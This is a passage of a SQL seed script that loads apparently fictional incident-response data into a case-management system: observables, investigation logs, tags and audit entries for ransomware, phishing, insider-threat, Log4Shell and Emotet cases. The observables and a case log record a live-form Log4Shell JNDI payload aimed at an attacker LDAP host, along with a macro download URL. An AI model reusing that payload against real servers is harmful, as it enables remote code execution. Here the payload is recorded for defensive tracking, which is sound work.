   'domain', 'sharepoint-login[.]example[.]com', 'Compromised WordPress site hosting phishing kit',
   2, true, true, false, ARRAY['phishing','domain','compromised'], 'dat.tran@pvo.com.vn',
   '2026-05-01T08:20:00Z', '2026-05-01T08:20:00Z'),

  ('20000000-0000-0000-0000-000000000007', 'legacy-obs-007',
   'd0000000-0000-0000-0000-000000000003',
   'ip', '192.0.2.45', 'Hosting IP for phishing kit',
   2, true, true, false, ARRAY['phishing','ip','hosting'], 'dat.tran@pvo.com.vn',
   '2026-05-01T08:25:00Z', '2026-05-01T08:25:00Z'),

  -- Case 4 observables: Insider threat
  ('20000000-0000-0000-0000-000000000008', 'legacy-obs-008',
   'd0000000-0000-0000-0000-000000000004',
   'other', 'KINGSTON DT100G3 S/N: 1234567890', 'USB device used for data exfiltration',
   4, true, false, false, ARRAY['insider-threat','usb','hardware'], 'nghia.dinh@ncsgroup.vn',
   '2026-05-02T16:30:00Z', '2026-05-02T16:30:00Z'),

  ('20000000-0000-0000-0000-000000000009', 'legacy-obs-009',
   'd0000000-0000-0000-0000-000000000004',
   'user-agent', 'john.doe@company.com', 'Employee account involved in data exfiltration',
   4, true, true, false, ARRAY['insider-threat','user','employee'], 'nghia.dinh@ncsgroup.vn',
   '2026-05-02T16:35:00Z', '2026-05-02T16:35:00Z'),

  -- Case 6 observables: Log4Shell
  ('20000000-0000-0000-0000-000000000010', 'legacy-obs-010',
   'd0000000-0000-0000-0000-000000000006',
   'ip', '185.220.101.34', 'Attacker IP sending Log4Shell payload',
   3, true, true, false, ARRAY['log4shell','exploitation','ip'], 'nghia.dinh@ncsgroup.vn',
   '2026-05-03T03:20:00Z', '2026-05-03T03:20:00Z'),

  ('20000000-0000-0000-0000-000000000011', 'legacy-obs-011',
   'd0000000-0000-0000-0000-000000000006',
   'other', '${jndi:ldap://185.220.101.34:1389/a}', 'Log4Shell JNDI payload string',
   3, true, true, false, ARRAY['log4shell','payload','jndi'], 'nghia.dinh@ncsgroup.vn',
   '2026-05-03T03:25:00Z', '2026-05-03T03:25:00Z'),

  ('20000000-0000-0000-0000-000000000012', 'legacy-obs-012',
   'd0000000-0000-0000-0000-000000000006',
   'hash_sha256', 'b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef1234567a',
   'APP-PROD-03 forensic image hash',
   3, false, false, false, ARRAY['forensics','hash','evidence'], 'dat.tran@pvo.com.vn',
   '2026-05-03T08:30:00Z', '2026-05-03T08:30:00Z'),

  -- Alert observables (not linked to case)
  ('20000000-0000-0000-0000-000000000013', 'legacy-obs-013',
   NULL,
   'domain', 'xkq7m9p2v4j8[.]top', 'DGA domain from DNS monitor alert',
   2, true, true, false, ARRAY['dga','dns','suspicious'], 'system',
   '2026-05-05T08:35:00Z', '2026-05-05T08:35:00Z'),

  ('20000000-0000-0000-0000-000000000014', 'legacy-obs-014',
   NULL,
   'ip', '194.5.249.132', 'Emotet C2 server IP',
   2, true, true, false, ARRAY['emotet','c2','malware'], 'system',
   '2026-05-05T10:05:00Z', '2026-05-05T10:05:00Z'),

  ('20000000-0000-0000-0000-000000000015', 'legacy-obs-015',
   NULL,
   'hash_sha256', 'c3d4e5f6789012345678901234567890abcdef1234567890abcdef12345678ab',
   'Emotet dropper sample hash',
   2, true, true, false, ARRAY['emotet','malware','hash'], 'system',
   '2026-05-05T10:10:00Z', '2026-05-05T10:10:00Z')
ON CONFLICT (id) DO NOTHING;

-- ---------------------------------------------------------------------------
-- 9. Case Logs — investigation notes
-- ---------------------------------------------------------------------------
INSERT INTO case_logs (id, case_id, task_id, message, created_by, created_at) VALUES

  -- Case 1 logs
  ('30000000-0000-0000-0000-000000000001', 'd0000000-0000-0000-0000-000000000001', NULL,
   '## Incident Declaration\n\nRansomware incident declared at 14:30 UTC. Initial triage indicates LockBit 3.0 variant. Three finance workstations affected. Escalating to L2.',
   'nghia.dinh@ncsgroup.vn', '2026-04-28T14:35:00Z'),

  ('30000000-0000-0000-0000-000000000002', 'd0000000-0000-0000-0000-000000000001', 'f0000000-0000-0000-0000-000000000001',
   'All three workstations isolated from network. Volatile memory captured using WinPmem. Memory images stored on forensic share: \\\\forensics\\case001\\memory\\',
   'nghia.dinh@ncsgroup.vn', '2026-04-28T16:35:00Z'),

  ('30000000-0000-0000-0000-000000000003', 'd0000000-0000-0000-0000-000000000001', 'f0000000-0000-0000-0000-000000000003',
   'Phishing email analysis complete:\n- Sender: ceo@company-spoofed.com (SPF fail)\n- Subject: "Urgent Wire Transfer Required"\n- Attachment: Invoice_Q2_2026.xlsm (SHA256: a1b2c3...)\n- Macro downloads payload from http://185.220.101.34/update.exe\n- Payload identified as LockBit 3.0 dropper',
   'nghia.dinh@ncsgroup.vn', '2026-04-29T11:05:00Z'),

  ('30000000-0000-0000-0000-000000000004', 'd0000000-0000-0000-0000-000000000001', NULL,
   'PVO partner notified. They will monitor for lateral movement indicators in their SIEM. Shared IOCs via MISP event #4521.',
   'nghia.dinh@ncsgroup.vn', '2026-04-29T14:00:00Z'),

  -- Case 3 logs
  ('30000000-0000-0000-0000-000000000005', 'd0000000-0000-0000-0000-000000000003', NULL,
   'Three HR employees reported clicking the phishing link:\n1. hr.user1@company.com — clicked, did NOT enter credentials\n2. hr.user2@company.com — clicked, entered credentials\n3. hr.user3@company.com — clicked, entered credentials\n\nCredential reset initiated for users 2 and 3.',
   'dat.tran@pvo.com.vn', '2026-05-01T09:00:00Z'),

  ('30000000-0000-0000-0000-000000000006', 'd0000000-0000-0000-0000-000000000003', 'f0000000-0000-0000-0000-000000000007',
   'Phishing domains blocked:\n- sharepoint-login.example.com → DNS sinkhole\n- cdn.phishkit.net → Proxy blocklist\n\nSubmitted to PhishTank and Google Safe Browsing.',
   'dat.tran@pvo.com.vn', '2026-05-01T09:35:00Z'),

  -- Case 4 logs
  ('30000000-0000-0000-0000-000000000007', 'd0000000-0000-0000-0000-000000000004', NULL,
   'DLP alert details:\n- Employee: john.doe@company.com (R&D Department)\n- Device: KINGSTON DT100G3 (S/N: 1234567890)\n- Data volume: 2.3 GB\n- Files include: source code repository (git clone), design documents (PDF), customer database export (CSV)\n\nEmployee access restricted. Badge deactivated. HR and Legal notified.',
   'nghia.dinh@ncsgroup.vn', '2026-05-02T16:45:00Z'),

  -- Case 6 logs
  ('30000000-0000-0000-0000-000000000008', 'd0000000-0000-0000-0000-000000000006', NULL,
   '## Log4Shell Exploitation Confirmed\n\nIDS detected CVE-2021-44228 exploitation against APP-PROD-03.\n\n**Payload:** `${jndi:ldap://185.220.101.34:1389/a}`\n**Target:** 10.0.1.50:8080 (Java application server)\n**Attacker IP:** 185.220.101.34\n\nServer was already patched (Log4j 2.17.1) but forensic image taken as precaution. Checking for any successful exploitation artifacts.',
   'nghia.dinh@ncsgroup.vn', '2026-05-03T03:30:00Z'),

  ('30000000-0000-0000-0000-000000000009', 'd0000000-0000-0000-0000-000000000006', 'f0000000-0000-0000-0000-000000000011',
   'Patch verification complete:\n- Log4j version: 2.17.1 ✓\n- JVM flag `-Dlog4j2.formatMsgNoLookups=true` set ✓\n- No evidence of successful exploitation in application logs\n- Server appears to have blocked the JNDI lookup',
   'nghia.dinh@ncsgroup.vn', '2026-05-03T05:35:00Z'),
   
  -- Case 10 logs
  ('30000000-0000-0000-0000-000000000010', 'd0000000-0000-0000-0000-000000000010', 'f0000000-0000-0000-0000-000000000015',
   'Đã hoàn tất ngắt kết nối mạng của máy chủ IIS public theo yêu cầu của NCS. Giữ nguồn máy chủ để NCS remote lấy bộ nhớ RAM.',
   'dat.tran@pvo.com.vn', '2026-05-06T10:30:00Z')
ON CONFLICT (id) DO NOTHING;

-- ---------------------------------------------------------------------------
-- 10. Custom Fields
-- ---------------------------------------------------------------------------
INSERT INTO custom_fields (id, owner_type, owner_id, name, value, created_at, updated_at) VALUES
  ('40000000-0000-0000-0000-000000000001', 'case', 'd0000000-0000-0000-0000-000000000001',
   'Business Impact', '"Critical — Finance department operations halted"'::jsonb,
   '2026-04-28T14:30:00Z', '2026-04-28T14:30:00Z'),
  ('40000000-0000-0000-0000-000000000002', 'case', 'd0000000-0000-0000-0000-000000000001',
   'Affected Systems', '"FIN-WS-01, FIN-WS-02, FIN-WS-03, FS-FIN-01"'::jsonb,
   '2026-04-28T14:30:00Z', '2026-04-28T14:30:00Z'),
  ('40000000-0000-0000-0000-000000000003', 'case', 'd0000000-0000-0000-0000-000000000001',
   'Ransom Demand', '"$50,000 in Bitcoin — wallet: bc1q..."'::jsonb,
   '2026-04-28T16:00:00Z', '2026-04-28T16:00:00Z'),
  ('40000000-0000-0000-0000-000000000004', 'case', 'd0000000-0000-0000-0000-000000000004',
   'Employee Status', '"Access restricted — pending HR investigation"'::jsonb,
   '2026-05-02T16:30:00Z', '2026-05-02T16:30:00Z'),
  ('40000000-0000-0000-0000-000000000005', 'case', 'd0000000-0000-0000-0000-000000000006',
   'CVE Reference', '"CVE-2021-44228 (Log4Shell)"'::jsonb,
   '2026-05-03T03:15:00Z', '2026-05-03T03:15:00Z'),
  ('40000000-0000-0000-0000-000000000006', 'alert', '10000000-0000-0000-0000-000000000001',
   'CrowdStrike Incident ID', '"INC-2026-0428-001"'::jsonb,
   '2026-04-28T14:25:00Z', '2026-04-28T14:25:00Z'),
  ('40000000-0000-0000-0000-000000000007', 'alert', '10000000-0000-0000-0000-000000000005',
   'Suricata SID', '"21003698"'::jsonb,
   '2026-05-03T03:10:00Z', '2026-05-03T03:10:00Z')
ON CONFLICT (id) DO NOTHING;

-- ---------------------------------------------------------------------------
-- 11. Tags
-- ---------------------------------------------------------------------------
INSERT INTO tags (id, name, created_at) VALUES
  ('50000000-0000-0000-0000-000000000001', 'ransomware', '2026-04-28T14:30:00Z'),
  ('50000000-0000-0000-0000-000000000002', 'lockbit', '2026-04-28T14:30:00Z'),
  ('50000000-0000-0000-0000-000000000003', 'phishing', '2026-04-15T10:00:00Z'),
  ('50000000-0000-0000-0000-000000000004', 'bec', '2026-04-15T10:00:00Z'),
  ('50000000-0000-0000-0000-000000000005', 'credential-theft', '2026-05-01T08:00:00Z'),
  ('50000000-0000-0000-0000-000000000006', 'insider-threat', '2026-05-02T16:00:00Z'),
  ('50000000-0000-0000-0000-000000000007', 'data-exfiltration', '2026-05-02T16:00:00Z'),
  ('50000000-0000-0000-0000-000000000008', 'log4shell', '2026-05-03T03:15:00Z'),
  ('50000000-0000-0000-0000-000000000009', 'cve-2021-44228', '2026-05-03T03:15:00Z'),
  ('50000000-0000-0000-0000-000000000010', 'brute-force', '2026-05-04T15:30:00Z'),
  ('50000000-0000-0000-0000-000000000011', 'vpn', '2026-05-04T15:30:00Z'),
  ('50000000-0000-0000-0000-000000000012', 'emotet', '2026-05-05T10:00:00Z'),
  ('50000000-0000-0000-0000-000000000013', 'malware', '2026-05-05T10:00:00Z'),
  ('50000000-0000-0000-0000-000000000014', 'ddos', '2026-04-20T22:00:00Z'),
  ('50000000-0000-0000-0000-000000000015', 'sql-injection', '2026-05-05T09:15:00Z'),
  ('50000000-0000-0000-0000-000000000016', 'dga', '2026-05-05T08:30:00Z'),
  ('50000000-0000-0000-0000-000000000017', 'c2', '2026-04-28T15:00:00Z'),
  ('50000000-0000-0000-0000-000000000018', 'social-engineering', '2026-04-15T10:00:00Z'),
  ('50000000-0000-0000-0000-000000000019', 'usb', '2026-05-02T16:00:00Z'),
  ('50000000-0000-0000-0000-000000000020', 'exploitation', '2026-05-03T03:15:00Z')
ON CONFLICT (id) DO NOTHING;

-- ---------------------------------------------------------------------------
-- 12. Audit Logs — activity trail
-- ---------------------------------------------------------------------------
INSERT INTO audit_logs (id, request_id, action, object_type, object_id, base, user_name, user_organisation, created_at) VALUES
  ('60000000-0000-0000-0000-000000000001', 'req-001', 'create', 'case', 'd0000000-0000-0000-0000-000000000001', '/api/v1/cases', 'nghia.dinh@ncsgroup.vn', 'NCS', '2026-04-28T14:30:00Z'),
  ('60000000-0000-0000-0000-000000000002', 'req-002', 'update', 'case', 'd0000000-0000-0000-0000-000000000001', '/api/v1/cases/d0000000-0000-0000-0000-000000000001', 'nghia.dinh@ncsgroup.vn', 'NCS', '2026-04-28T15:00:00Z'),
  ('60000000-0000-0000-0000-000000000003', 'req-003', 'create', 'task', 'f0000000-0000-0000-0000-000000000001', '/api/v1/cases/d0000000-0000-0000-0000-000000000001/tasks', 'nghia.dinh@ncsgroup.vn', 'NCS', '2026-04-28T14:30:00Z'),
  ('60000000-0000-0000-0000-000000000004', 'req-004', 'update', 'task', 'f0000000-0000-0000-0000-000000000001', '/api/v1/tasks/f0000000-0000-0000-0000-000000000001', 'nghia.dinh@ncsgroup.vn', 'NCS', '2026-04-28T16:30:00Z'),
  ('60000000-0000-0000-0000-000000000005', 'req-005', 'create', 'observable', '20000000-0000-0000-0000-000000000001', '/api/v1/cases/d0000000-0000-0000-0000-000000000001/observables', 'nghia.dinh@ncsgroup.vn', 'NCS', '2026-04-28T15:00:00Z'),
  ('60000000-0000-0000-0000-000000000006', 'req-006', 'import', 'alert', '10000000-0000-0000-0000-000000000001', '/api/v1/alerts/import', 'system', 'NCS', '2026-04-28T14:25:00Z'),
  ('60000000-0000-0000-0000-000000000007', 'req-007', 'merge', 'alert', '10000000-0000-0000-0000-000000000001', '/api/v1/alerts/10000000-0000-0000-0000-000000000001/merge', 'nghia.dinh@ncsgroup.vn', 'NCS', '2026-04-28T14:30:00Z'),
  ('60000000-0000-0000-0000-000000000008', 'req-008', 'create', 'case', 'd0000000-0000-0000-0000-000000000003', '/api/v1/cases', 'nghia.dinh@ncsgroup.vn', 'NCS', '2026-05-01T08:00:00Z'),
  ('60000000-0000-0000-0000-000000000009', 'req-009', 'create', 'case', 'd0000000-0000-0000-0000-000000000004', '/api/v1/cases', 'nghia.dinh@ncsgroup.vn', 'NCS', '2026-05-02T16:00:00Z'),
  ('60000000-0000-0000-0000-000000000010', 'req-010', 'create', 'case', 'd0000000-0000-0000-0000-000000000006', '/api/v1/cases', 'nghia.dinh@ncsgroup.vn', 'NCS', '2026-05-03T03:15:00Z'),
  ('60000000-0000-0000-0000-000000000011', 'req-011', 'create', 'case', 'd0000000-0000-0000-0000-000000000008', '/api/v1/cases', 'analyst.soc@ncsgroup.vn', 'PVO', '2026-05-04T15:30:00Z'),
  ('60000000-0000-0000-0000-000000000012', 'req-012', 'update', 'case', 'd0000000-0000-0000-0000-000000000002', '/api/v1/cases/d0000000-0000-0000-0000-000000000002', 'dat.tran@pvo.com.vn', 'NCS', '2026-04-16T16:45:00Z'),
  ('60000000-0000-0000-0000-000000000013', 'req-013', 'merge', 'case', 'd0000000-0000-0000-0000-000000000009', '/api/v1/cases/d0000000-0000-0000-0000-000000000009/merge', 'dat.tran@pvo.com.vn', 'NCS', '2026-04-16T09:30:00Z'),
  ('60000000-0000-0000-0000-000000000014', 'req-014', 'create', 'case', 'd0000000-0000-0000-0000-000000000010', '/api/v1/cases', 'nghia.dinh@ncsgroup.vn', 'NCS', '2026-05-06T10:00:00Z')
ON CONFLICT (id) DO NOTHING;

COMMIT;
